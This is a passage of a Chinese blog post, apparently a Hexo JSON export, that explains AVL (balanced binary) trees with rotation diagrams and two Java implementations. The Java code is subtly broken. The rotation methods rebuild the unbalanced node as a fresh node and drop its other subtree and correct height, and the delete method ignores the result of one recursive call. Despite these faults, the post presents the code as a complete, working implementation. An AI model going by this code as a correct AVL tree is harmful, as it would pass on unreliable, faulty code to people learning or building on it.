title=\"3.完整代码\"></a>3.完整代码</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class MyTest &#123;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    private static class Node&lt;E&gt;&#123;</span><br><span class=\"line\">        E elment;</span><br><span class=\"line\">        Node&lt;E&gt; left;</span><br><span class=\"line\">        Node&lt;E&gt; right;</span><br><span class=\"line\">        int height;</span><br><span class=\"line\"></span><br><span class=\"line\">        Node(E elment)&#123;</span><br><span class=\"line\">            this(elment, null, null);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        Node(E elment, Node left, Node right)&#123;</span><br><span class=\"line\">            this.elment = elment;</span><br><span class=\"line\">            this.left = left;</span><br><span class=\"line\">            this.right = right;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    private static class AVLTree&lt;E extends Comparable&lt;? super E&gt;&gt;&#123;</span><br><span class=\"line\">        Node root;</span><br><span class=\"line\"></span><br><span class=\"line\">        public AVLTree()&#123;</span><br><span class=\"line\">            this.root = null;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        public void insert(E elment)&#123;</span><br><span class=\"line\">            this.root = insert(this.root, elment);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        public void delete(E elment)&#123;</span><br><span class=\"line\">            if (elment != null)&#123;</span><br><span class=\"line\">                this.root = delete(this.root, elment);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        //递归找到要插入的位置插入，同时在return中平衡高度</span><br><span class=\"line\">        public Node insert(Node&lt;E&gt; root, E elemet)&#123;</span><br><span class=\"line\">            if( root == null )&#123;</span><br><span class=\"line\">                return new Node(elemet);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            if(elemet.compareTo(root.elment) &lt; 0 )&#123;</span><br><span class=\"line\">                //左边插入</span><br><span class=\"line\">                root.left = insert(root.left, elemet);</span><br><span class=\"line\">                //在return后平衡高度,因为是在左边插入，所以如果高度不平衡，只会是左边高于右边</span><br><span class=\"line\">                if(height(root.left) - height(root.right) == 2)&#123;</span><br><span class=\"line\">                    //判断是插在子节点的左边还是右边</span><br><span class=\"line\">                    if(elemet.compareTo(root.left.elment) &lt; 0)&#123;</span><br><span class=\"line\">                        //LL</span><br><span class=\"line\">                        root = nodeLL(root);</span><br><span class=\"line\">                    &#125;else &#123;</span><br><span class=\"line\">                        //LR</span><br><span class=\"line\">                        root = nodeLR(root);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;else if(elemet.compareTo(root.elment) &gt; 0)&#123;</span><br><span class=\"line\">                //右边插入</span><br><span class=\"line\">                root.right = insert(root.right, elemet);</span><br><span class=\"line\">                //在return后平衡高度,因为是在右边插入，所以如果高度不平衡，只会是右边高于左边</span><br><span class=\"line\">                if(height(root.right) - height(root.left) == 2)&#123;</span><br><span class=\"line\">                    //判断是插在子节点的左边还是右边</span><br><span class=\"line\">                    if(elemet.compareTo(root.right.elment) &lt; 0)&#123;</span><br><span class=\"line\">                        //RL</span><br><span class=\"line\">                        root = nodeRL(root);</span><br><span class=\"line\">                    &#125;else &#123;</span><br><span class=\"line\">                        //RR</span><br><span class=\"line\">                        root = nodeRR(root);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            //更新节点高度</span><br><span class=\"line\">            root.height = Math.max(height(root.left),height(root.right)) + 1;</span><br><span class=\"line\">            return root;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        //右旋</span><br><span class=\"line\">        private Node nodeLL(Node node)&#123;</span><br><span class=\"line\">            //1.将失衡节点的左节点提升</span><br><span class=\"line\">            Node newNode = node.left;</span><br><span class=\"line\">            //2.将失衡节点下降</span><br><span class=\"line\">            newNode.right = new Node(node.elment);</span><br><span class=\"line\">            //3.失衡节点的左子节点的右子节点处理</span><br><span class=\"line\">            newNode.right.left = node.left.right;</span><br><span class=\"line\">            //调整高度值</span><br><span class=\"line\">            newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;</span><br><span class=\"line\">            return newNode;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        //左旋</span><br><span class=\"line\">        private Node nodeRR(Node node)&#123;</span><br><span class=\"line\">            //1.将失衡节点的右子节点提升</span><br><span class=\"line\">            Node newNode = node.right;</span><br><span class=\"line\">            //2.将失衡节点下沉</span><br><span class=\"line\">            newNode.left = new Node(node.elment);</span><br><span class=\"line\">            //3.失衡节点的右节点的左孩子处理</span><br><span class=\"line\">            newNode.left.right = node.right.left;</span><br><span class=\"line\">            //调整高度</span><br><span class=\"line\">            newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;</span><br><span class=\"line\">            return newNode;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        //左旋再右旋</span><br><span class=\"line\">        private Node nodeLR(Node node)&#123;</span><br><span class=\"line\">            Node newNode = node.left.right;</span><br><span class=\"line\">            newNode.left = new Node(node.left.elment);</span><br><span class=\"line\">            newNode.right = new Node(node.elment);</span><br><span class=\"line\">            newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;</span><br><span class=\"line\">            return newNode;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        //右旋再左旋</span><br><span class=\"line\">        private Node nodeRL(Node node)&#123;</span><br><span class=\"line\">            Node newNode = node.right.left;</span><br><span class=\"line\">            newNode.left = new Node(node.elment);</span><br><span class=\"line\">            newNode.right = new Node(node.right.elment);</span><br><span class=\"line\">            newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;</span><br><span class=\"line\">            return newNode;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        private int height(Node node)&#123;</span><br><span class=\"line\">            return node == null ? -1:node.height;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        public Node delete(Node&lt;E&gt; root, E element)&#123;</span><br><span class=\"line\">            if (root == null)&#123;</span><br><span class=\"line\">                return null;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            if(element.compareTo(root.elment) &lt; 0)&#123;</span><br><span class=\"line\">                //左递归</span><br><span class=\"line\">                root.left = delete(root.left, element);</span><br><span class=\"line\">                //重新调整平衡，删除左边，调整右边</span><br><span class=\"line\">                if(height(root.left) - height(root.right) == 2 || height(root.left) - height(root.right) == -2)&#123;</span><br><span class=\"line\">                    //判断是哪种调整方式</span><br><span class=\"line\">                    // 只有失衡节点的右子树的左节点</span><br><span class=\"line\">                    if(root.right.right == null)&#123;</span><br><span class=\"line\">                        //RL</span><br><span class=\"line\">                        root = nodeRL(root);</span><br><span class=\"line\">                    &#125;else &#123;</span><br><span class=\"line\">                        //RR</span><br><span class=\"line\">                        root = nodeRR(root);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;else if(element.compareTo(root.elment) &gt; 0)&#123;</span><br><span class=\"line\">                //右递归</span><br><span class=\"line\">                root.right = delete(root.right, element);</span><br><span class=\"line\">                //重新调整平衡，删除右边，调整左边</span><br><span class=\"line\">                if(height(root.right) - height(root.left) == 2 || height(root.right) - height(root.left) == -2)&#123;</span><br><span class=\"line\">                    //判断调整类型</span><br><span class=\"line\">                    //只有失衡节点的左子树的右节点</span><br><span class=\"line\">                    if(root.left.left == null)&#123;</span><br><span class=\"line\">                        //LR</span><br><span class=\"line\">                        root = nodeLR(root);</span><br><span class=\"line\">                    &#125;else &#123;</span><br><span class=\"line\">                        //LL</span><br><span class=\"line\">                        root = nodeLL(root);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;else &#123;</span><br><span class=\"line\">                //删除</span><br><span class=\"line\">                if(root.left != null &amp;&amp; root.right != null)&#123;</span><br><span class=\"line\">                    //有两个子节点</span><br><span class=\"line\">                    //找到替换得节点，右子树最小值</span><br><span class=\"line\">                    root.elment = findElement(root);</span><br><span class=\"line\">                    //删除替换节点，替换节点一定是叶子节点</span><br><span class=\"line\">                    delete(root.right, root.elment);</span><br><span class=\"line\"></span><br><span class=\"line\">                &#125;else if(root.left == null &amp;&amp; root.right == null)&#123;</span><br><span class=\"line\">                    //无子节点，自己是叶子节点</span><br><span class=\"line\">                    root = null;</span><br><span class=\"line\">                &#125;else &#123;</span><br><span class=\"line\">                    //有一个子节点</span><br><span class=\"line\">                    root = root.left != null ? root.left : root.right;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            return root;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        //判断替换点为左子树最大还是右子树最小</span><br><span class=\"line\">        private E findElement(Node&lt;E&gt; root)&#123;</span><br><span class=\"line\">            if(height(root.left) &gt;= height(root.right))&#123;</span><br><span class=\"line\">                return findLeftMax(root.left);</span><br><span class=\"line\">            &#125;else &#123;</span><br><span class=\"line\">                return findRightMin(root.right);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        private E findRightMin(Node&lt;E&gt; root)&#123;</span><br><span class=\"line\">            while (root.left != null)&#123;</span><br><span class=\"line\">                root = root.left;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">           return root.elment;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        private E findLeftMax(Node&lt;E&gt; root)&#123;</span><br><span class=\"line\">            while (root.right != null)&#123;</span><br><span class=\"line\">                root = root.right;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            return root.elment;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        AVLTree tree = new AVLTree();</span><br><span class=\"line\">        tree.insert(4);</span><br><span class=\"line\">        tree.insert(2);</span><br><span class=\"line\">        tree.insert(5);</span><br><span class=\"line\">        tree.insert(1);</span><br><span class=\"line\">        tree.insert(3);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        System.out.println(tree.root.elment);</span><br><span class=\"line\">        tree.delete(5);</span><br><span class=\"line\">        System.out.println(tree.root.elment);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"一-什么是平衡二叉树\"><a href=\"#一-什么是平衡二叉树\" class=\"headerlink\" title=\"一.什么是平衡二叉树\"></a>一.什么是平衡二叉树</h1><p>平衡二叉树也是一种二叉查找树，有以下特点:</p>\n<ul>\n<li>1.可以是空树。</li>\n<li>2.假如不是空树，任何一个结点的左子树与右子树都是平衡二叉树，并且高度之差的绝对值不超过 1 (即高度要平衡)</li>\n</ul>\n<h1 id=\"二-为什么要有平衡二叉树，即优缺点\"><a href=\"#二-为什么要有平衡二叉树，即优缺点\" class=\"headerlink\" title=\"二.为什么要有平衡二叉树，即优缺点\"></a>二.为什么要有平衡二叉树，即优缺点</h1><ul>\n<li>优</li>\n</ul>\n<p>在树这种数据结构中，树的高度影响着查找速度，层数越少，需要查询的次数越少，效率越高。<br>而平衡二叉树，能减少树的高度，防止出现极端O(N)的情况，使效率稳定为O(logN).</p>\n<ul>\n<li>缺</li>\n</ul>\n<p>当数据量越来越大时，为了保证高度平衡，动态插入和删除的代价也随之增加。<br></p>\n<p>在大数据量查找环境下(如数据库记录查找)，在二叉树结构下(2*N -1),N的层会太大，造成硬盘IO读写次数过多。(使用多路查找树).</p>\n<h1 id=\"三-怎么实现\"><a href=\"#三-怎么实现\" class=\"headerlink\" title=\"三.怎么实现\"></a>三.怎么实现</h1><p>AVL树，平衡二叉树的最早实现之一。以下为AVL树的实现.</p>\n<h3 id=\"1-原理\"><a href=\"#1-原理\" class=\"headerlink\" title=\"1.原理\"></a>1.原理</h3><p>因为平衡二叉树比二叉查找树多了一些性质来保证高度平衡.所以在每一次插入数值之后，树的平衡性都可能被破坏，这时可以通过一个简单的操作来矫正平衡––旋转。<br></p>\n<p>旋转的目的就是减少高度，通过降低整棵树的高度来平衡。哪边的树高，就把那边的树向上旋转。</p>\n<p>四种旋转:<br></p>\n<p>旋转是以失衡的节点为基准的<br><br>LL的解释, 第一个L代表根节点左边，第二个L代表插入的为左节点<br></p>\n<ul>\n<li>LL（左子树的左节点上插入节点而破坏平衡）：右旋转</li>\n</ul>\n<p>第一个 L: <strong>左子树</strong> <br><br>第二个 L: 失衡节点的左孩子的 <strong>左节点</strong>.</p>\n<p><img src=\"http://67.216.218.49:8000/file/blogs/algorithm/avl_tree_LL.webp\" alt=\"LL\"></p>\n<ul>\n<li>RR（右子树的右节点上插入节点而破坏平衡）：左旋转</li>\n</ul>\n<p>第一个 R: <strong>右子树</strong> <br><br>第二个 R: 失衡节点的右孩子的 <strong>右节点</strong>.<br><img src=\"http://67.216.218.49:8000/file/blogs/algorithm/avl_tree_RR.webp\" alt=\"RR\"></p>\n<ul>\n<li>LR（左子树的右节点上插入节点而破坏平衡）：先左旋后右旋</li>\n</ul>\n<p>第一个 L: <strong>左子树</strong> <br><br>第二个 R: 失衡节点的左孩子的 <strong>右节点</strong>.<br><img src=\"http://67.216.218.49:8000/file/blogs/algorithm/avl_tree_LR.webp\" alt=\"LR\"></p>\n<ul>\n<li>RL（右子树的左节点上插入节点而破坏平衡）：先右旋后左旋</li>\n</ul>\n<p>第一个 R: <strong>右子树</strong> <br><br>第二个 L: 失衡节点的右孩子的 <strong>左节点</strong>.<br><img src=\"http://67.216.218.49:8000/file/blogs/algorithm/avl_tree_RL.webp\" alt=\"RL\"></p>\n<h3 id=\"2-实现代码\"><a href=\"#2-实现代码\" class=\"headerlink\" title=\"2.实现代码\"></a>2.实现代码</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class MyTest &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    private static class Node&lt;E&gt;&#123;</span><br><span class=\"line\">        E elment;</span><br><span class=\"line\">        Node&lt;E&gt; left;</span><br><span class=\"line\">        Node&lt;E&gt; right;</span><br><span class=\"line\">        int height;</span><br><span class=\"line\"></span><br><span class=\"line\">        Node(E elment)&#123;</span><br><span class=\"line\">            this(elment, null, null);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        Node(E elment, Node left, Node right)&#123;</span><br><span class=\"line\">            this.elment = elment;</span><br><span class=\"line\">            this.left = left;</span><br><span class=\"line\">            this.right = right;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    private static class AVLTree&lt;E extends Comparable&lt;? super E&gt;&gt;&#123;</span><br><span class=\"line\">        Node root;</span><br><span class=\"line\"></span><br><span class=\"line\">        public AVLTree()&#123;</span><br><span class=\"line\">            this.root = null;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        public void insert(E elment)&#123;</span><br><span class=\"line\">            this.root = insert(this.root, elment);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        //递归找到要插入的位置插入，同时在return中平衡高度</span><br><span class=\"line\">        public Node insert(Node&lt;E&gt; root, E elemet)&#123;</span><br><span class=\"line\">            if( root == null )&#123;</span><br><span class=\"line\">                return new Node(elemet);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            if(elemet.compareTo(root.elment) &lt; 0 )&#123;</span><br><span class=\"line\">                //左边插入</span><br><span class=\"line\">                root.left = insert(root.left, elemet);</span><br><span class=\"line\">                //在return后平衡高度,因为是在左边插入，所以如果高度不平衡，只会是左边高于右边</span><br><span class=\"line\">                if(height(root.left) - height(root.right) == 2)&#123;</span><br><span class=\"line\">                    //判断是插在子节点的左边还是右边</span><br><span class=\"line\">                    if(elemet.compareTo(root.left.elment) &lt; 0)&#123;</span><br><span class=\"line\">                        //LL</span><br><span class=\"line\">                        root = nodeLL(root);</span><br><span class=\"line\">                    &#125;else &#123;</span><br><span class=\"line\">                        //LR</span><br><span class=\"line\">                        root = nodeLR(root);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;else if(elemet.compareTo(root.elment) &gt; 0)&#123;</span><br><span class=\"line\">                //右边插入</span><br><span class=\"line\">                root.right = insert(root.right, elemet);</span><br><span class=\"line\">                //在return后平衡高度,因为是在右边插入，所以如果高度不平衡，只会是右边高于左边</span><br><span class=\"line\">                if(height(root.right) - height(root.left) == 2)&#123;</span><br><span class=\"line\">                    //判断是插在子节点的左边还是右边</span><br><span class=\"line\">                    if(elemet.compareTo(root.right.elment) &lt; 0)&#123;</span><br><span class=\"line\">                        //RL</span><br><span class=\"line\">                        root = nodeRL(root);</span><br><span class=\"line\">                    &#125;else &#123;</span><br><span class=\"line\">                        //RR</span><br><span class=\"line\">                        root = nodeRR(root);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            //更新节点高度</span><br><span class=\"line\">            root.height = Math.max(height(root.left),height(root.right)) + 1;</span><br><span class=\"line\">            return root;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        //右旋</span><br><span class=\"line\">        private Node nodeLL(Node node)&#123;</span><br><span class=\"line\">            //旋转</span><br><span class=\"line\">            Node newNode = node.left;</span><br><span class=\"line\">            newNode.right = new Node(node.elment);</span><br><span class=\"line\">            //调整高度值</span><br><span class=\"line\">            newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;</span><br><span class=\"line\">            return newNode;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        //左旋</span><br><span class=\"line\">        private Node nodeRR(Node node)&#123;</span><br><span class=\"line\">            Node newNode = node.right;</span><br><span class=\"line\">            newNode.left = new Node(node.elment);</span><br><span class=\"line\">            newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;</span><br><span class=\"line\">            return newNode;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        //左旋再右旋</span><br><span class=\"line\">        private Node nodeLR(Node node)&#123;</span><br><span class=\"line\">            Node newNode = node.left.right;</span><br><span class=\"line\">            newNode.left = new Node(node.left.elment);</span><br><span class=\"line\">            newNode.right = new Node(node.elment);</span><br><span class=\"line\">            newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;</span><br><span class=\"line\">            return newNode;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        //右旋再左旋</span><br><span class=\"line\">        private Node nodeRL(Node node)&#123;</span><br><span class=\"line\">            Node newNode = node.right.left;</span><br><span class=\"line\">            newNode.left = new Node(node.elment);</span><br><span class=\"line\">            newNode.right = new Node(node.right.elment);</span><br><span class=\"line\">            newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;</span><br><span class=\"line\">            return newNode;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        private int height(Node node)&#123;</span><br><span class=\"line\">            return node == null ? -1:node.height;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        AVLTree tree = new AVLTree();</span><br><span class=\"line\">        tree.insert(5);</span><br><span class=\"line\">        tree.insert(4);</span><br><span class=\"line\">        tree.insert(6);</span><br><span class=\"line\">        tree.insert(3);</span><br><span class=\"line\">        tree.insert(2);</span><br><span class=\"line\"></span><br><span class=\"line\">        